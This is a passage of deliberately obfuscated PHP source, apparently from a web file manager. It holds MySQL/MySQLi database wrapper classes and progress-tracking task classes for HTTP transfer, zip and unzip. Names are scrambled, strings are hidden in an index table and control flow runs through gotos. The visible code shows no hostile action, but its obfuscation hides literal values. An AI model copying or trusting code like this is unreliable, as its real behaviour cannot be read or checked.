$b‹±ØŒ¸Ïƒ) . $C‘™ÜŒ†[582] . implode($C‘™ÜŒ†[47], $D¹ÎÀÔ–”) . $C‘™ÜŒ†[583]; return $this->execute($BìŒ¢©Õ¦¡); } public function insertAll($aåÅ¢ì²†, $aöÏƒ÷’Ù = array(), $EÕÕÌ¯ËË = false) { goto f“´ö¤Ñ¨¹; f“´ö¤Ñ¨¹: $f–†«Ê«® =& $_SERVER[°Óó£ÌİóèÅ]; if (!is_array($aåÅ¢ì²†[0])) { return !1; } $FÅ¸ÔßÇİ = array_keys($aåÅ¢ì²†[0]); goto DîäÅÀƒ•‚; DîäÅÀƒ•‚: $b„ÎÍŒÖŞí = array(); foreach ($aåÅ¢ì²† as $c”¬ö·Ğº) { $a‡äí”¹¯Ô = array(); foreach ($c”¬ö·Ğº as $Bæ˜¶ˆ™œ => $eˆòª¾ó£¡) { $eˆòª¾ó£¡ = $this->parseValue($eˆòª¾ó£¡); if (is_scalar($eˆòª¾ó£¡)) { $a‡äí”¹¯Ô[] = $eˆòª¾ó£¡; } } $b„ÎÍŒÖŞí[] = $f–†«Ê«®[259] . implode($f–†«Ê«®[47], $a‡äí”¹¯Ô) . $f–†«Ê«®[583]; } array_walk($FÅ¸ÔßÇİ, array($this, $f–†«Ê«®[584])); goto cÜÄ™Ù‹ˆ; cÜÄ™Ù‹ˆ: $FÓ¢ÚˆÏ·‹ = ($EÕÕÌ¯ËË ? $f–†«Ê«®[585] : $f–†«Ê«®[586]) . $f–†«Ê«®[587] . $this->parseTable($aöÏƒ÷’Ù[$f–†«Ê«®[278]]) . $f–†«Ê«®[581] . implode($f–†«Ê«®[47], $FÅ¸ÔßÇİ) . $f–†«Ê«®[588] . implode($f–†«Ê«®[47], $b„ÎÍŒÖŞí); return $this->execute($FÓ¢ÚˆÏ·‹); goto Eƒ†ääå‡Ğ; Eƒ†ääå‡Ğ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $bØÍÔÚÎĞ² =& $_SERVER[°Óó£ÌİóèÅ]; $this->error = mysql_errno() . $bØÍÔÚÎĞ²[4] . mysql_error($this->_linkID); if ($bØÍÔÚÎĞ²[33] != $this->queryStr) { $this->error .= LNG($bØÍÔÚÎĞ²[45]) . $this->queryStr; } think_trace($this->error, $bØÍÔÚÎĞ²[33], $bØÍÔÚÎĞ²[46]); return $this->error; } public function escapeString($fê®°ß…Ó¸) { if ($this->_linkID) { return mysql_real_escape_string($fê®°ß…Ó¸, $this->_linkID); } else { return mysql_escape_string($fê®°ß…Ó¸); } } public function parseKey(&$CŞ…§ĞĞí , $Bçºã¨ÕÍ = true) { $f´ø‰ËèŒÙ =& $_SERVER[°Óó£ÌİóèÅ]; if ($Bçºã¨ÕÍ) { $CŞ…§ĞĞí  = $this->parseKeyCheck($CŞ…§ĞĞí ); } if ($CŞ…§ĞĞí  != $f´ø‰ËèŒÙ[181] && !preg_match($f´ø‰ËèŒÙ[589], $CŞ…§ĞĞí )) { $CŞ…§ĞĞí  = $f´ø‰ËèŒÙ[590] . trim($CŞ…§ĞĞí , $f´ø‰ËèŒÙ[590]) . $f´ø‰ËèŒÙ[590]; } return $CŞ…§ĞĞí ; } } class DbMysqli extends Db { public function __construct($Eò“ÁÜ‰ïì = '') { $Bïåƒ¹Ş³È =& $_SERVER[°Óó£ÌİóèÅ]; if (!extension_loaded($Bïåƒ¹Ş³È[591])) { think_exception(think_lang($Bïåƒ¹Ş³È[10]) . $Bïåƒ¹Ş³È[592]); } if (!empty($Eò“ÁÜ‰ïì)) { $this->config = $Eò“ÁÜ‰ïì; if (empty($this->config[$Bïåƒ¹Ş³È[13]])) { $this->config[$Bïåƒ¹Ş³È[13]] = $Bïåƒ¹Ş³È[33]; } } } public function connect($f†‡™­à§ä = '', $f”œÃÎ© = 0) { $Bé™­£‹ö‡ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->linkID[$f”œÃÎ©])) { goto c™‘ô¢¬; Dôõ…×ó‹Ë: $this->connected = !0; if (1 != think_config($Bé™­£‹ö‡[18])) { unset($this->config); } goto A÷Œ³‡¾Ä¨; C­ÂÙè’Õ: $Cö¹‚¨¹• = $this->linkID[$f”œÃÎ©]->server_version; $this->linkID[$f”œÃÎ©]->query($Bé™­£‹ö‡[569] . think_config($Bé™­£‹ö‡[570]) . $Bé™­£‹ö‡[55]); if ($Cö¹‚¨¹• > $Bé™­£‹ö‡[571]) { $this->linkID[$f”œÃÎ©]->query($Bé™­£‹ö‡[572]); } goto Dôõ…×ó‹Ë; c™‘ô¢¬: if (empty($f†‡™­à§ä)) { $f†‡™­à§ä = $this->config; } $this->linkID[$f”œÃÎ©] = new mysqli($f†‡™­à§ä[$Bé™­£‹ö‡[565]], $f†‡™­à§ä[$Bé™­£‹ö‡[567]], $f†‡™­à§ä[$Bé™­£‹ö‡[568]], $f†‡™­à§ä[$Bé™­£‹ö‡[17]], $f†‡™­à§ä[$Bé™­£‹ö‡[566]] ? intval($f†‡™­à§ä[$Bé™­£‹ö‡[566]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C­ÂÙè’Õ; A÷Œ³‡¾Ä¨: } return $this->linkID[$f”œÃÎ©]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($DÛŒŒ½•½) { goto DÉ÷„Ö³Š; a‚Ô£Óœ : $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aßŸƒê‚»; a†Œ¤Œ¦®Ø: think_status($D¢‘çç›Ó…[20]); $this->queryID = $this->_linkID->query($DÛŒŒ½•½); if ($this->_linkID->more_results()) { while (($D¬«‹×‰š = $this->_linkID->next_result()) != NULL) { $D¬«‹×‰š->free_result(); } } goto a‚Ô£Óœ ; DÉ÷„Ö³Š: $D¢‘çç›Ó… =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÒŠ†É´ãò; CÒŠ†É´ãò: $this->queryStr = $DÛŒŒ½•½; if ($this->queryID) { $this->free(); } think_action_status($D¢‘çç›Ó…[19], 1); goto a†Œ¤Œ¦®Ø; aßŸƒê‚»: } public function execute($EÖŞóÕ†‹) { goto b–‘˜º“‚˜; b–‘˜º“‚˜: $FïéóÛª…ô =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DµÖîõ“»ƒ; e®èŒ…‚‹Ÿ: if (!1 === $AğÛˆÓÁ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aá†éÛ…Ô´; DµÖîõ“»ƒ: $this->queryStr = $EÖŞóÕ†‹; if ($this->queryID) { $this->free(); } think_action_status($FïéóÛª…ô[21], 1); goto c¹Ó•’„; c¹Ó•’„: think_status($FïéóÛª…ô[20]); $AğÛˆÓÁ = $this->_linkID->query($EÖŞóÕ†‹); $this->debug(); goto e®èŒ…‚‹Ÿ; aá†éÛ…Ô´: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÌöÜŒÂœ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dÌöÜŒÂœ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aƒ¬²˜² = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aƒ¬²˜²) { $this->error(); return !1; } } return !0; } private function getAll() { $AÕ¨À·ËŒ = array(); if ($this->numRows > 0) { for ($fµ•…£Ê’¡ = 0; $fµ•…£Ê’¡ < $this->numRows; $fµ•…£Ê’¡++) { $AÕ¨À·ËŒ[$fµ•…£Ê’¡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $AÕ¨À·ËŒ; } public function getFields($BøÆäƒö…±) { $c×¬èÅÆ =& $_SERVER[°Óó£ÌİóèÅ]; $e¿Õ±—º¬ˆ = $this->query($c×¬èÅÆ[576] . $this->parseKey($BøÆäƒö…±)); $AİÜÏ•÷•´ = array(); if ($e¿Õ±—º¬ˆ) { foreach ($e¿Õ±—º¬ˆ as $F¢õ¹Ò—¸Œ => $fÂÛÎ«©¯ñ) { $AİÜÏ•÷•´[$fÂÛÎ«©¯ñ[$c×¬èÅÆ[27]]] = array($c×¬èÅÆ[28] => $fÂÛÎ«©¯ñ[$c×¬èÅÆ[27]], $c×¬èÅÆ[29] => $fÂÛÎ«©¯ñ[$c×¬èÅÆ[30]], $c×¬èÅÆ[31] => (bool) ($fÂÛÎ«©¯ñ[$c×¬èÅÆ[32]] === $c×¬èÅÆ[33]), $c×¬èÅÆ[34] => $fÂÛÎ«©¯ñ[$c×¬èÅÆ[35]], $c×¬èÅÆ[36] => strtolower($fÂÛÎ«©¯ñ[$c×¬èÅÆ[37]]) == $c×¬èÅÆ[38], $c×¬èÅÆ[39] => strtolower($fÂÛÎ«©¯ñ[$c×¬èÅÆ[40]]) == $c×¬èÅÆ[41]); } } return $AİÜÏ•÷•´; } public function getTables($e™¼ƒ­¢Ü¹ = '') { $c¬„’ù¸‘¾ =& $_SERVER[°Óó£ÌİóèÅ]; $cŠƒŒìì‰ = !empty($e™¼ƒ­¢Ü¹) ? $c¬„’ù¸‘¾[578] . $e™¼ƒ­¢Ü¹ : $c¬„’ù¸‘¾[579]; $Fø›…œ‹ª = $this->query($cŠƒŒìì‰); $Bêà§™’¥… = array(); if ($Fø›…œ‹ª) { foreach ($Fø›…œ‹ª as $AŠ¤Ô‚® => $Fçç˜øÒÕö) { $Bêà§™’¥…[$AŠ¤Ô‚®] = current($Fçç˜øÒÕö); } } return $Bêà§™’¥…; } public function replace($c‚¹ôŞ‚Üœ, $Dô§‹§©¨ò = array()) { $c²‰ÊÍô× =& $_SERVER[°Óó£ÌİóèÅ]; foreach ($c‚¹ôŞ‚Üœ as $c±›­ï‡ó => $Cõ±İÚ›Ğœ) { $a­Â‰Û²¡ª = $this->parseValue($Cõ±İÚ›Ğœ); if (is_scalar($a­Â‰Û²¡ª)) { $eø±êƒ¼Ê¢[] = $a­Â‰Û²¡ª; $EÀ½Ú¯ã¾Ä[] = $this->parseKey($c±›­ï‡ó); } } $b¢ÒÄ²ƒ§Ó = $c²‰ÊÍô×[580] . $this->parseTable($Dô§‹§©¨ò[$c²‰ÊÍô×[278]]) . $c²‰ÊÍô×[581] . implode($c²‰ÊÍô×[47], $EÀ½Ú¯ã¾Ä) . $c²‰ÊÍô×[582] . implode($c²‰ÊÍô×[47], $eø±êƒ¼Ê¢) . $c²‰ÊÍô×[583]; return $this->execute($b¢ÒÄ²ƒ§Ó); } public function insertAll($d‚óáİÁˆ®, $dİ«áØå Á = array(), $A»öõÍçñ„ = false) { goto F©¬ôõ£…´; A“­ŒíĞÚ: $DÜÖÌ£ÛäÜ = ($A»öõÍçñ„ ? $B®‰ô£›´[585] : $B®‰ô£›´[586]) . $B®‰ô£›´[587] . $this->parseTable($dİ«áØå Á[$B®‰ô£›´[278]]) . $B®‰ô£›´[581] . implode($B®‰ô£›´[47], $f­áå–ÌÍ¢) . $B®‰ô£›´[588] . implode($B®‰ô£›´[47], $f¶òè‡ØÄ”); return $this->execute($DÜÖÌ£ÛäÜ); goto aÏè•öñ¿; F©¬ôõ£…´: $B®‰ô£›´ =& $_SERVER[°Óó£ÌİóèÅ]; if (!is_array($d‚óáİÁˆ®[0])) { return !1; } $f­áå–ÌÍ¢ = array_keys($d‚óáİÁˆ®[0]); goto aÔ˜—¢ö; aÔ˜—¢ö: $f¶òè‡ØÄ” = array(); foreach ($d‚óáİÁˆ® as $b„á¡øƒŒ») { $bùåªôÍÌÀ = array(); foreach ($b„á¡øƒŒ» as $DÏîÂ™» => $cˆ®ÙÙ§È) { $cˆ®ÙÙ§È = $this->parseValue($cˆ®ÙÙ§È); if (is_scalar($cˆ®ÙÙ§È)) { $bùåªôÍÌÀ[] = $cˆ®ÙÙ§È; } } $f¶òè‡ØÄ”[] = $B®‰ô£›´[259] . implode($B®‰ô£›´[47], $bùåªôÍÌÀ) . $B®‰ô£›´[583]; } array_walk($f­áå–ÌÍ¢, array($this, $B®‰ô£›´[584])); goto A“­ŒíĞÚ; aÏè•öñ¿: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $cÕÚÛÚ‰ =& $_SERVER[°Óó£ÌİóèÅ]; $this->error = $this->_linkID->errno . $cÕÚÛÚ‰[4] . $this->_linkID->error; if ($cÕÚÛÚ‰[33] != $this->queryStr) { $this->error .= LNG($cÕÚÛÚ‰[45]) . $this->queryStr; } think_trace($this->error, $cÕÚÛÚ‰[33], $cÕÚÛÚ‰[46]); return $this->error; } public function escapeString($eˆ³ñÌõÑÌ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eˆ³ñÌõÑÌ); } else { return addslashes($eˆ³ñÌõÑÌ); } } public function parseKey(&$EÍÔÃˆƒšÓ, $b‚İÀƒ§”· = true) { $c“–ÅŠ¯Õ… =& $_SERVER[°Óó£ÌİóèÅ]; if ($b‚İÀƒ§”·) { $EÍÔÃˆƒšÓ = $this->parseKeyCheck($EÍÔÃˆƒšÓ); } if ($EÍÔÃˆƒšÓ != $c“–ÅŠ¯Õ…[181] && !preg_match($c“–ÅŠ¯Õ…[589], $EÍÔÃˆƒšÓ)) { $EÍÔÃˆƒšÓ = $c“–ÅŠ¯Õ…[590] . trim($EÍÔÃˆƒšÓ, $c“–ÅŠ¯Õ…[590]) . $c“–ÅŠ¯Õ…[590]; } return $EÍÔÃˆƒšÓ; } } goto bƒŸŠ•ƒƒË; a‰†î³ÂŠ: class TaskHttp extends Task { protected function startAfter() { $aŒÄÜñğƒ˜ =& $_SERVER[°Óó£ÌİóèÅ]; $eÓ°©°ñ™å =& $this->task; Hook::bind($aŒÄÜñğƒ˜[1129], array($this, $aŒÄÜñğƒ˜[1147])); Hook::bind($aŒÄÜñğƒ˜[1127], array($this, $aŒÄÜñğƒ˜[1148])); Hook::bind($aŒÄÜñğƒ˜[1131], array($this, $aŒÄÜñğƒ˜[1149])); } protected function endAfter() { $aµ•‚ï—¤ =& $_SERVER[°Óó£ÌİóèÅ]; Hook::unbind($aµ•‚ï—¤[1129], array($this, $aµ•‚ï—¤[1147])); } public function progressStart($B­¾ˆ‰ŠÆ) { $cŞ‰“áÅœ =& $_SERVER[°Óó£ÌİóèÅ]; $A¬µç„¸¶ï = curl_getinfo($B­¾ˆ‰ŠÆ); self::log($cŞ‰“áÅœ[1150] . $A¬µç„¸¶ï[$cŞ‰“áÅœ[306]]); self::valueSet($this->task[$cŞ‰“áÅœ[376]], $this->task); } public function progressEnd($cÆÂ×à•âá) { $d‹ïÎóŒé =& $_SERVER[°Óó£ÌİóèÅ]; self::log($d‹ïÎóŒé[1151] . $this->task[$d‹ïÎóŒé[376]]); $this->end(); } public function progress($aÕÑ‘¢ÁèÊ, $bç°³µÔ, $aÂ§Ø¼ŞÇË, $eŠ‘ù˜Õ›£, $eÈ¼ŸĞîÈ) { $eâºÛÎ§´ =& $_SERVER[°Óó£ÌİóèÅ]; $aæ„Øçğ¨Ò =& $this->task; if ($eÈ¼ŸĞîÈ > 0) { $aæ„Øçğ¨Ò[$eâºÛÎ§´[1097]] = $aæ„Øçğ¨Ò[$eâºÛÎ§´[1097]] == 0 ? $eŠ‘ù˜Õ›£ : $aæ„Øçğ¨Ò[$eâºÛÎ§´[1097]]; $aæ„Øçğ¨Ò[$eâºÛÎ§´[1098]] = $eÈ¼ŸĞîÈ; } else { if ($aÂ§Ø¼ŞÇË > 0) { $aæ„Øçğ¨Ò[$eâºÛÎ§´[1097]] = $aæ„Øçğ¨Ò[$eâºÛÎ§´[1097]] == 0 ? $bç°³µÔ : $aæ„Øçğ¨Ò[$eâºÛÎ§´[1097]]; $aæ„Øçğ¨Ò[$eâºÛÎ§´[1098]] = $aÂ§Ø¼ŞÇË; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\x73\163\110\164\164\x70\x3a\x64\x6f\x77\156\72{$aÂ§Ø¼ŞÇË}\x2f{$bç°³µÔ}\73\x20\x75\160\x6c\x6f\x61\x64\72{$eÈ¼ŸĞîÈ}\57{$eŠ‘ù˜Õ›£}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto A‹‹À…¼Ï÷; C§ãò‹£ƒÏ: if (!$A›÷åÕ¬¶«[$cåéß¼‚ˆ[1001]]) { $A›÷åÕ¬¶«[$cåéß¼‚ˆ[1001]] = LNG($cåéß¼‚ˆ[1156]); } goto e¯Ñ¦Ø¥Ù‘; A‹‹À…¼Ï÷: $cåéß¼‚ˆ =& $_SERVER[°Óó£ÌİóèÅ]; parent::startAfter(); Hook::bind($cåéß¼‚ˆ[1152], array($this, $cåéß¼‚ˆ[1153])); goto a®é—¢…—§; a®é—¢…—§: Hook::bind($cåéß¼‚ˆ[784], array($this, $cåéß¼‚ˆ[1154])); $A›÷åÕ¬¶« =& $this->task; $A›÷åÕ¬¶«[$cåéß¼‚ˆ[1155]] = $cåéß¼‚ˆ[789]; goto C§ãò‹£ƒÏ; e¯Ñ¦Ø¥Ù‘: } protected function endAfter() { $bÚÕ‚ÏŒäò =& $_SERVER[°Óó£ÌİóèÅ]; parent::endAfter(); Hook::unbind($bÚÕ‚ÏŒäò[1152], array($this, $bÚÕ‚ÏŒäò[1153])); Hook::unbind($bÚÕ‚ÏŒäò[784], array($this, $bÚÕ‚ÏŒäò[1154])); } public function updateAfter() { $AÅİ´ĞÇßš =& $_SERVER[°Óó£ÌİóèÅ]; $A…ÔŸ ¥‘ =& $this->task; if (!$A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1097]] || !$A…ÔŸ ¥‘[$AÅİ´ĞÇßš[463]]) { return; } if ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1155]] == $AÅİ´ĞÇßš[789]) { $b—Ù°Æ’–Ó = 0; if ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1135]]) { $b—Ù°Æ’–Ó = $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1136]] / $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1135]]; } $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1099]] = $b—Ù°Æ’–Ó * 0.3; } else { if ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1155]] == $AÅİ´ĞÇßš[312]) { $b—Ù°Æ’–Ó = $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1098]] / $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1097]]; $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1099]] = 0.3 + $b—Ù°Æ’–Ó * 0.4; } else { if ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1155]] == $AÅİ´ĞÇßš[98]) { $BàÀö‡­Å = 0; if ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1137]] == $AÅİ´ĞÇßš[98]) { $BàÀö‡­Å = $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1136]]; } $b—Ù°Æ’–Ó = ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1140]] + $BàÀö‡­Å) / $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[463]]; $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1099]] = 0.3 + 0.4 + $b—Ù°Æ’–Ó * 0.3; } } } if ($A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1099]] > 0) { $AÀ‚ùñåİ = timeFloat() - $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1101]] - $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1104]]; $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1105]] = $AÀ‚ùñåİ * (1 - $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1099]]) / $A…ÔŸ ¥‘[$AÅİ´ĞÇßš[1099]]; } } public function addFile($cëøØƒ˜õ) { goto Bñ±äÃï’; A÷æè“¬ŒÏ: $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1097]] = 1; $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1141]] = array(); $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1141]][] = array($CÁÛ­¹šáÃ[395] => $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[28]], $CÁÛ­¹šáÃ[84] => $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[84]], $CÁÛ­¹šáÃ[774] => $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[774]] ? $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[774]] : $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[84]]); goto A„àéóç; A„àéóç: $this->update(); goto CÊò½ì©×‡; Cê—¨ØĞÛõ: $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1133]] = $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[28]]; $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1135]] = $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[86]]; $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1136]] = 0; goto EÕ¡ˆĞ–£¾; EÕ¡ˆĞ–£¾: $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1096]] = $CÁÛ­¹šáÃ[1145]; $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[1137]] = $CÁÛ­¹šáÃ[789]; $EŸµĞ¸ˆ°ô[$CÁÛ­¹šáÃ[463]] = $AÔ¹øì¯–Œ[$CÁÛ­¹šáÃ[86]]; goto A÷æè“¬ŒÏ; Bñ±äÃï’: $CÁÛ­¹šáÃ =& $_SERVER[°Óó£ÌİóèÅ]; $EŸµĞ¸ˆ°ô =& $this->task; $AÔ¹øì¯–Œ = IO::info($cëøØƒ˜õ); goto Cê—¨ØĞÛõ; CÊò½ì©×‡: } public function unzipAfter($A¡©ÜÒáŒ®) { goto B¯ô¹ùİĞŠ; DÍîĞôŒº¹: if ($a¯Û÷·÷[$AÁ¡‰½¶ñ[29]] == $AÁ¡‰½¶ñ[172]) { $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1097]] = 1; } else { $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1097]] = $a¯Û÷·÷[$AÁ¡‰½¶ñ[89]][$AÁ¡‰½¶ñ[87]]; } $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1096]] = $AÁ¡‰½¶ñ[33]; $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1137]] = 0; goto b„ĞäùåÑ¢; bÎê£àì˜Û: $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1133]] = $AÁ¡‰½¶ñ[33]; $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1140]] = 0; $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[463]] = $a¯Û÷·÷[$AÁ¡‰½¶ñ[86]]; goto a™¨° ğ—´; CéÑÄ†Öå: $a¯Û÷·÷ = IO::infoWithChildren($A¡©ÜÒáŒ®); $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1141]] = array(); $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1141]][] = array($AÁ¡‰½¶ñ[395] => $a¯Û÷·÷[$AÁ¡‰½¶ñ[28]], $AÁ¡‰½¶ñ[84] => $a¯Û÷·÷[$AÁ¡‰½¶ñ[84]], $AÁ¡‰½¶ñ[774] => $a¯Û÷·÷[$AÁ¡‰½¶ñ[774]] ? $a¯Û÷·÷[$AÁ¡‰½¶ñ[774]] : $a¯Û÷·÷[$AÁ¡‰½¶ñ[84]]); goto DÍîĞôŒº¹; B¯ô¹ùİĞŠ: $AÁ¡‰½¶ñ =& $_SERVER[°Óó£ÌİóèÅ]; $FÅ¶Á¢ø„Ù =& $this->task; $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1155]] = $AÁ¡‰½¶ñ[98]; goto CéÑÄ†Öå; b„ĞäùåÑ¢: $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1098]] = 0; $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1135]] = 0; $FÅ¶Á¢ø„Ù[$AÁ¡‰½¶ñ[1136]] = 0; goto bÎê£àì˜Û; a™¨° ğ—´: $this->update(); self::log($AÁ¡‰½¶ñ[1157] . json_encode(array($FÅ¶Á¢ø„Ù, $a¯Û÷·÷))); goto Eö°Ã×ˆŸ; Eö°Ã×ˆŸ: } public function nameParse($d²ğªİë) { goto C„„ò»œ¨’; CİÀ—¸: $this->update(); goto c‹£±¬Â¡; C„„ò»œ¨’: $CŞÓ’‰íÕ =& $_SERVER[°Óó£ÌİóèÅ]; $FÄİõ—³•Ü =& $this->task; if ($FÄİõ—³•Ü[$CŞÓ’‰íÕ[1155]] == $CŞÓ’‰íÕ[789]) { $FÄİõ—³•Ü[$CŞÓ’‰íÕ[1155]] = $CŞÓ’‰íÕ[312]; $FÄİõ—³•Ü[$CŞÓ’‰íÕ[1140]] = 0; $FÄİõ—³•Ü[$CŞÓ’‰íÕ[463]] = 0; } goto d…°Ÿ³Ô²; d…°Ÿ³Ô²: $eèƒ×Ö´–Ö = get_path_this($d²ğªİë); if (strstr($eèƒ×Ö´–Ö, $CŞÓ’‰íÕ[100])) { $FÄİõ—³•Ü[$CŞÓ’‰íÕ[1098]] += 1; $FÄİõ—³•Ü[$CŞÓ’‰íÕ[1097]] += 1; } $FÄİõ—³•Ü[$CŞÓ’‰íÕ[1133]] = $d²ğªİë; goto CİÀ—¸; c‹£±¬Â¡: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $DØó‘™« =& $_SERVER[°Óó£ÌİóèÅ]; parent::startAfter(); Hook::bind($DØó‘™«[1158], array($this, $DØó‘™«[1153])); $d¬£„Ášó§ =& $this->task; $d¬£„Ášó§[$DØó‘™«[1155]] = $DØó‘™«[789]; if (!$d¬£„Ášó§[$DØó‘™«[1001]]) { $d¬£„Ášó§[$DØó‘™«[1001]] = LNG($DØó‘™«[1159]); } } protected function endAfter() { $bö³†É—¸ë =& $_SERVER[°Óó£ÌİóèÅ]; parent::endAfter(); Hook::unbind($bö³†É—¸ë[1158], array($this, $bö³†É—¸ë[1153])); } public function updateAfter() { $AŠ§„ÊÙÙÒ =& $_SERVER[°Óó£ÌİóèÅ]; $aêÄÄãæ„ =& $this->task; if (!$aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1097]] || !$aêÄÄãæ„[$AŠ§„ÊÙÙÒ[463]]) { return; } if ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1155]] == $AŠ§„ÊÙÙÒ[789]) { $A£Ô¹¦ù’Á = $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1136]]; if ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1137]] != $AŠ§„ÊÙÙÒ[789]) { $A£Ô¹¦ù’Á = 0; } $CÀ…„¹İˆ = ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1140]] + $A£Ô¹¦ù’Á) / $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[463]]; $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1099]] = $CÀ…„¹İˆ * 0.3; } else { if ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1155]] == $AŠ§„ÊÙÙÒ[312]) { $CÀ…„¹İˆ = $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1098]] / $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1097]]; $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1099]] = 0.3 + $CÀ…„¹İˆ * 0.5; } else { if ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1155]] == $AŠ§„ÊÙÙÒ[98]) { $CÀ…„¹İˆ = 0; if ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1135]]) { $CÀ…„¹İˆ = $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1136]] / $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1135]]; } $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1099]] = 0.3 + 0.5 + $CÀ…„¹İˆ * 0.2; } } } if ($aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1099]] > 0) { $F¤¼ÂÌØº˜ = timeFloat() - $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1101]] - $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1104]]; $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1105]] = $F¤¼ÂÌØº˜ * (1 - $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1099]]) / $aêÄÄãæ„[$AŠ§„ÊÙÙÒ[1099]]; } } public function copyFileStart($a˜‡¼›ÛŞÙ, $CôØÙˆİ‹, $D¼Ô’ ëÁ, $c¿Ìí„Â, $b»„Ê±‘‰Õ, $dµ¥Òë´è) { $A¯Ò÷á˜„§ =& $_SERVER[°Óó£ÌİóèÅ]; parent::copyFileStart($a˜‡¼›ÛŞÙ, $CôØÙˆİ‹, $D¼Ô’ ëÁ, $c¿Ìí„Â, $b»„Ê±‘‰Õ, $dµ¥Òë´è); $E‡¥‹÷çˆÌ =& $this->task; if ($E‡¥‹÷çˆÌ[$A¯Ò÷á˜„§[1155]] == $A¯Ò÷á˜„§[312]) { $E‡¥‹÷çˆÌ[$A¯Ò÷á˜„§[1155]] = $A¯Ò÷á˜„§[98]; } $this->update(); } public function 